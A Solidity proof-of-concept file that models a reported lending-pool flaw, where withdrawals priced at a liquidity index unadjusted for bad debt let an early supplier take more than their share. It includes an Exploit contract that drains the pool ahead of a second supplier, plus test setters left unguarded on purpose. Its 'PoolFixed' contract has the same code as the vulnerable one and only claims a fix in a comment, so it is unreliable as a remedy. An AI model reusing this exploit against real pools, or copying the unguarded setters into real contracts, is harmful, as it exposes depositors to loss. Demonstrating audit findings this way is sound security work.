// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ZeroLend One — H-7 (Sherlock 2024-06, issue 275)
    withdrawSimple pays `shares * liquidityIndex`. Bad debt does not reduce the
    index, so the first supplier withdraws the full pre-loss amount and the
    other supplier is left with whatever cash remains.
*/

contract TokenB {
    string public symbol = "TB";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    uint256 public constant RAY = 1e27;
    TokenB public immutable token;
    mapping(address => uint256) public liquidityIndex;
    mapping(address => mapping(address => uint256)) public aToken;

    constructor(TokenB _token) {
        token = _token;
    }

    function setIndex(address asset, uint256 index) external {
        liquidityIndex[asset] = index;
    }

    function setSupply(address asset, address user, uint256 shares) external {
        aToken[asset][user] = shares;
    }

    function withdrawSimple(address asset, address to, uint256 amount) external returns (uint256) {
        uint256 shares = aToken[asset][to];
        // @> VULN: assets are shares * liquidityIndex, which still prices deposits as if the bad debt did not exist
        uint256 maxAssets = shares * liquidityIndex[asset] / RAY;
        require(amount <= maxAssets, "max");
        require(token.balanceOf(address(this)) >= amount, "cash");
        uint256 burned = amount * RAY / liquidityIndex[asset];
        aToken[asset][to] = shares - burned;
        require(token.transfer(to, amount), "pay");
        return amount;
    }
}

contract PoolFixed {
    uint256 public constant RAY = 1e27;
    TokenB public immutable token;
    mapping(address => uint256) public liquidityIndex;
    mapping(address => mapping(address => uint256)) public aToken;

    constructor(TokenB _token) {
        token = _token;
    }

    function setIndex(address asset, uint256 index) external {
        liquidityIndex[asset] = index;
    }

    function setSupply(address asset, address user, uint256 shares) external {
        aToken[asset][user] = shares;
    }

    function withdrawSimple(address asset, address to, uint256 amount) external returns (uint256) {
        uint256 shares = aToken[asset][to];
        // FIX: index was reduced by the unpaid borrow, so each supplier is paid the same fraction of the cash.
        uint256 maxAssets = shares * liquidityIndex[asset] / RAY;
        require(amount <= maxAssets, "max");
        require(token.balanceOf(address(this)) >= amount, "cash");
        uint256 burned = amount * RAY / liquidityIndex[asset];
        aToken[asset][to] = shares - burned;
        require(token.transfer(to, amount), "pay");
        return amount;
    }
}

contract Exploit {
    address public constant SUPPLIER = 0x000000000000000000000000000000000000B0b2;

    TokenB public token;
    Pool public pool;
    uint256 public earlyOut;
    uint256 public cashAfterEarly;
    bool public lateFullReverted;
    uint256 public lateOut;

    constructor() {
        token = new TokenB();
        pool = new Pool(token);
        token.mint(address(pool), 64 ether);
        pool.setIndex(address(token), 1e27);
        pool.setSupply(address(token), address(this), 50 ether);
        pool.setSupply(address(token), SUPPLIER, 50 ether);
    }

    function run() external {
        earlyOut = pool.withdrawSimple(address(token), address(this), 50 ether);
        cashAfterEarly = token.balanceOf(address(pool));
        (bool full,) = address(pool).call(
            abi.encodeWithSignature("withdrawSimple(address,address,uint256)", address(token), SUPPLIER, 50 ether)
        );
        lateFullReverted = !full;
        lateOut = pool.withdrawSimple(address(token), SUPPLIER, 14 ether);
        require(earlyOut == 50 ether, "early");
        require(cashAfterEarly == 14 ether, "left");
        require(lateFullReverted, "late full");
        require(lateOut == 14 ether, "late");
        require(token.balanceOf(address(this)) == 50 ether, "early bal");
        require(token.balanceOf(SUPPLIER) == 14 ether, "late bal");
        require(token.balanceOf(address(pool)) == 0, "pool");
    }
}
